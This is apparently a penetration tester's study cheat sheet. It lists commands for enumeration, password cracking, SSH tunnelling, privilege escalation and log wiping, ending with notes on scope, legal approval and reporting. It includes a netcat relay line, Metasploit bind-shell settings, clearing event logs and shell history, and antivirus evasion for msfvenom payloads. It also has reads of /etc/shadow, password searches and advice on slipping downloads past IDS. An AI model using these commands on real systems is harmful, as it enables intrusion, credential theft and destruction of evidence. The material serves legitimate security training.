
Enumeration

[*] Tools
    dirb / dirbuster / gobuster


Vulnerability Scanners

[*] nikto - OSCP Test Usable
        nikto -h <IP addr>


[*] Metasploit
    db_nmap
        Just use nmap with -oA for the .xml file.


[*] BurpSuite
    Paid version has scanner


[*] openvas
    



Password Attacks

[*] crunch - wordlist generator
    crunch 4 4
    crunch 4 4 -f /usr/share/crunch charset.lst numeric #  For pin size 4 numbers
    crunch 4 4 abc1 #  Generate wordlist for abc1
    crunch 6 6 0123456789abcdef -o 6chars.txt #  Use wordlist provided, 6 chars long and output to file


[*] cewl - custom wordlist generator
    cewl -d 2 -m 5 -1 /root/Desktop/Files/docswords.txt http://<hostname/IP>/bWAPP/ba_pwd_attacks_1.php #  directory traverse by 2 and minimum password 5 chars.
        Use the wordlist, maybe for hydra or Burp

[*] hydra - Brutefoce tool

[*] medusa - Bruteforce tool

[*] ncrack - Bruteforce tool

[*] john - Password cracker
    john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/hashed_passwords.txt

[*] https://www.ampliasecurity.com/research/windows-credentials-editor/






Public Exploits


[*] exploit-db.com


[*] searchsploit


[*] github.com



SSH Tunneling

[*] Remote Port Forwarding.
    Access a port that's blocked. 8181 for localhost. FTP 21 is closed so we redirect it to our 8181. Right over SSH.
        ssh -L 8181:<remote IPv4>:21 ssh <username>@<remote IPv4>

[*] Local port forwarding
    OpenVAS listening on 9392, forward to 8181. Now remote machine is listening on localhost 8182. You can use GUI to localhost port 8181 to see OpenVAS. 
        ssh -R 8181:127.0.0.1:9392 <username>@<remote IPv4>

[*] Dynamic Port Forwarding
    Create a dynamic tunnel to another machine.
    Update /etc/proxychains to allows socks5 127.0.0.1 9050
        ssh -D 8181 <username>@<remote IPv4>
    Socks proxy
        ssh -D 8181 <username>@<remote IPv4>
    Tor Proxy - begin all commands with "proxychains <command>"
        service tor start
        service tor status
        netstat -antp | grep 9050 #  Check for LISTEN
        vi /etc/procychains
            dynamic_chain
            socks5 127.0.0.1 9050



Lateral and Vertical Movement


[*] Tunnel traffic dynamically:
        ssh -D 8181 <username>@<remote IPv4>
    Now nmap - this will parse through a hacked machine that is dynamically set through your above proxy over ssh.
        proxychains nmap -sV -p<ports> <IPv4 on same LAN>

    Now let's run msfconsole (metasploit) through the proxy:
        proxychains msfconsole
            This will help with exploits locally through your proxied server.

[*] Create a Tunnel to the remote host to local machine:
        ssh -L 8181:<remote IPv4>:445 <username>@<remote IPv4>
    Open msfconsole then set RHOST to local
        msfconsole
        set RHOST 127.0.0.1
        set RPORT 8181
        set payload windows/shell/bind_tcp
        set RHOST <remote IPv4> #  Payload only
        set LPORT 8181
        run




Erasing Your Tracks

[*] Metasploit - Windows
    Obtain a meterpreter shell and remove logs:
        meterpreter> clearev

    You can upload ClearLogs.exe file and execute:
        meterpreter> upload /path/to/ClearLogs.exe

[*] Linux
    Set the history size to zero to be saved:
        export $HISTSIZE=0
    Shred the logs:
        shred -zu ~/.bash_history #  Military rade wipe, no forensics possible

[*] Google for Python, Perl, PowerShell scripts to clear logs.
    Just write your own.



AntiVirus Avoidance
    TL;DR - Create your own malware to avoid detection.

[*] Scan Files for AV fingerprints
    [*] virustotal.com
    [*] hybrid-analysis.com

[*] Encoders for AV Bypass
    [*] /usr/share/windows-binaries/hyperion/hyperion.exe
            wine /usr/share/windows-binaries/hyperion/hyperion.exe /path/to/msfvenom-exploit.exe /same-path/to/msfvenom-exploit-hyperion.exe

[*] github.com/Veil-Framework/Veil-Evasion/tools/prescrambler/PEScrambler.exe
        wine64 /root/Downloads/PEScrambler.exe -i msfvenom-exploit.exe -o msfvenom-exploit-scrambles.exe

[*] pyinstaller - Convert python to exe
    pyinstaller --onefile testpy.py



Buffer Overflow Basic Concepts


[*] Basic concepts
    LIFO (acronym) - Last In First Out memory consumption - Basic memory stack for program
        ESP - Points to top of stack.
        EIP - Points to the next instructions. Don't confuse as the next execution, just next path to potentially be executed.
        EBP - Points to the bottom of the stack.


Immunity Debugger: Fuzzing


[*] immunityinc.com/products/debugger - Windows based debugger for buffer overflow.


[*] github.com/corelan/mona - debugger
    mona.py

Metasploit .rb script scripts for buffer overflow

[*] pattern_create.rb -l <number of characters> find the EIP
    This script gives you unique characters to help find point of buffer overflow


[*] pattern_offset.rb -q <buffer index of overflow>
    This gives you he offset of where we hit the buffer overflow.


Bad Characters

[*] bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
    Bad character list


[*] Practice:
    ctf101.org/binary-exploitation/stack-canaries


Linux Priv Esc

[*] Debian (dpkg) / RHEL (RPM) - Some work on both flavors
    cat /etc/issue
    cat /etc/passwd
    cat /etc/*release*
    cat/proc/version
    uname -a
    uname -mrs
    dmesg | grep Linux
    ls /boot/ | grep vmlinuz
    cat /etc/profile
    cat ~/.bashrc
    cat ~/.bash_logout
    env
    lpstat -a #  Printer check
    sudo -l
    # g0tmi1k has commands to help.
    ps -auroot
    ps -au<username>
    ps aux | grep <username>
    ps -ef
    top
    cat /etc/services
    netstat -antp
    ls -alh /usr/bin
    ls -alh /sbin/
    dpkg -l
    crontab -l
    cat /etc/crontab
    ls -alh /var/spool/cron/
    grep -iRl "pass" /
    mount
    df -h
    cat /etc/fstab
    find / -perm 1000 -type d 2>/dev/null
    find / -perm -g=s -type f 2>/dev/null
    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
    find / -writable -type d 2>/dev/null
    find / -perm -222 -type d 2>/dev/null
    find / -writable -type f 2>/dev/null
    find / -writable -perm -g=s -type f 2>/dev/null
    find / -writable -perm -g=s -type d 2>/dev/null
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null
    find /etc/ -readable -type f 2>/dev/null



[*] Linux Networking
    /sbin/ifconfig
    /etc/network*
    cat /etc/resolv.conf
    cat /etc/hosts
    cat /etc/sysctl.conf
    cat /etc/networks
    iptables -L
    hostname
    hostnamectl
    cat /etc/services | grep 80
    netstat -antup
    netstat -antpx
    netstat -tulpn
    last
    w
    route
    route -n
    /sbin/route -nee
    mknod backpipe p ; nc  -l -p 4444 < backpipe | nc <IPv4 to connect> > backpipe



[*] Misconfigured Files - Confidential Information
    id #  Check our user id and groups
    who #  Who all is logged in
    cat /etc/passwd
    cat /etc/shadow
    cat /etc/sudoers
    cat /etc/group
    ls -alh /var/mail/
    ls -alhR /root/
    wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
        Remember IDS/WAF may detective malicious file download. Think about ncat --ssl or copy/paste the script if possible.


Windows Priv Esc


[*] System information
    systeminfo
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    hostname
    whoami
    echo %username%
    net users
    route print
    arp -a
    netstat -aob
    netstat -ao
    netsh firewall show state
    netsh firewall show config
    schtask /query /fo LIST /v
    tasklist /SVC #  running open ports
    netstart
    DRIVERQUERY


[*] WMIC - Windows Management Instrumentation Command Line
    wmic qfe get Caption,Description,HostFixID,InstalledOn
    wmic qfe get Caption,Description,HostFixID,InstalledOn | findstr /C:"KBXXXXXX" #  If not found, patch was not applied.
    Usefule directories/Files:
        C:\sysprep.inf
        C:\sysprep\sysprep.xml
        %WINDIR%\Panther\Unattend\Unattended.xml
        %WINDIR%\Panther\Unattended.xml
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated #  If found, admin user can install, think nmap or netcat.
    Grep a string:
        dir /s *pass* == *creds*
        findstr /si password *.xml
        findstr /si password *.ini
        findstr /si password *.txt
        reg query HKELM /f password /t REG_SZ /s
    Useful link for automated scripts:
        fuzzysecurity.com/coding.html
        Powersploit #  Google it


[*] Windows Application and Services
    Sysinternal Suite #  Cool features for administering host. Also good for hacking.
        sc qc Spooler
        accesschk.exe -ucqv Sooler #  rights and privs on Spooler
        accesschk.exe -uwcqv "Authenticate Users" *
        accesschk.exe -qwsu "Users" * #  Sticky bit version of Linux in Windows
    PowerShell



Penetration Simulation

[*] Pre-Engagement Actions
    Scope of work
        Remotely?
        On Site?
        Internal?
        External?
        Remember international Laws
            Customer may approve but the law says differently
            Remember local laws, county, state, country
                Jurisdiction of law
            Key length/size RSA >2048 not allowed in certain countries
            GET A LAWYER
        Date and time length
        IP(s) - subnets
        Maintaining linear hack
            Customer says one app - stick to one app.
            Different types of hacks may be restricted
        Regulations:
            PCI
            HIPPA



[*] Dealing with 3rd Parties
    Sometimes you wont be able to touch 3rd party infrastructure
        Webhosting - did Bluehost approve?
        Set up meetings to make sure you can hit the target.
        Develo softskills lol
    Cloud Services
        AWS, Azure, Google Cloud etc.
            Are they ok with you testing?
            Azure may give ok, just ask!


[*] Rules of Engagement
    Tester brings his own tools. Always.
        Don't alter systems if you can avoid it.
        Bring tools so anything altered happens on you machine.
        Ask for Greybox - Staging
        Inform the teams involved - Networking, cloud, etc teams. They need to know you are hacking
    You may need to clean up after yourself
    Take snapshots
    Data destructive needs to be verified
    They ask for hack - make sure they know what they are asking and if approved


[*] Documentation and Handling
    Verify what they want in a report
        Executed report of what you did
        Formal RCA - Executive
        Informal RCA - Technical
    https://githubcom/juliocesarfort/public-pentesting-reports


[*] Additional Support Based on Hourly Rate
    They ask for hack


[*] Questionaries
    Ask questions
        Make sure they get what they want.
        Network test?
        Server attacks
        Applications
        Web pages
        Wireless network
        Physical?
            What happens if a guard gets me?
            Are they aware of pen test?
            Will I pickup a bullet?
        Social Engineer



[*] Privilege Escalation Simulation
    Linenum.sh
    linuxprivchecker.py





[*] Reporting and Next Steps
    Work as a partner, not a black hat hacker.
    Once reporting delivered, offer to help patch and update if needed.
        Charge for this lol
        Offer fixes for vulnerabilities
    Business impact for vuln servers
        Cost of loss of servers.
        Example: Apply patches to business critical servers before a printer server
        Don't touch anything, offer the help first, then work with teams to apply patches.
    Executive Report - Exec level
    Technical Report - For the techs, so they can start patching
    Remember - You may get a call 6 months later, hang on to reports.
        Customer's may take time to patch systems, they will most likely call later.
    Report "Risk" - each vuln is a risk, how easy was it and how bad will the system git fukt
        Low
        Medium
        High
    

